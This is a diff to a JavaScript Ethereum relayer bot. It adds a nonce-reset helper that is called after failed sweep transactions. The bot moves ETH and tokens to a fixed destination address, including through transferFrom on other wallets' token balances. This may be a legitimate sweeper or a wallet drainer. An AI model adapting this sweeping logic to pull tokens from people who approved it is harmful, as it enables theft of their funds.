@@ -383,6 +383,22 @@ async function getFeeData() {
   return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
 }
 
+// ── Nonce recovery helper ─────────────────────────────────────────────────────
+// Ethers v6 NonceManager increments in memory but does not automatically reset
+// after a rejected tx (replacement-underpriced, already-known, etc.).
+// Call this in catch blocks so the next tx uses the correct on-chain nonce.
+function maybeResetNonce(e) {
+  const msg = (e?.message ?? String(e ?? "")).toLowerCase();
+  if (
+    msg.includes("nonce") ||
+    msg.includes("replacement") ||
+    msg.includes("already known") ||
+    msg.includes("underpriced")
+  ) {
+    try { relayerWallet.reset(); } catch { /* ignore */ }
+  }
+}
+
 // ── Main-contract sweep ───────────────────────────────────────────────────────
 
 async function sweepETH() {
@@ -398,7 +414,7 @@ async function sweepETH() {
     log(`sweepETH tx: ${tx.hash}`);
     await tx.wait();
     log("sweepETH confirmed");
-  } catch (e) { err(`sweepETH: ${e.message}`); }
+  } catch (e) { maybeResetNonce(e); err(`sweepETH: ${e.message}`); }
   finally    { sweepingETH = false; }
 }
 
@@ -420,7 +436,7 @@ async function sweepToken(tokenAddress) {
     const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
     log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
     await tx.wait();
-  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
+  } catch (e) { maybeResetNonce(e); err(`sweepToken(${tokenAddress}): ${e.message}`); }
   finally     { sweepingToken[key] = false; }
 }
 
@@ -1544,7 +1560,7 @@ async function sweep(wallet) {
           const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
           await tx.wait();
           log(`[direct] ✅ swept ${sym} from ${short}`);
-        } catch (e) { err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
+        } catch (e) { maybeResetNonce(e); err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
       }
     }
 
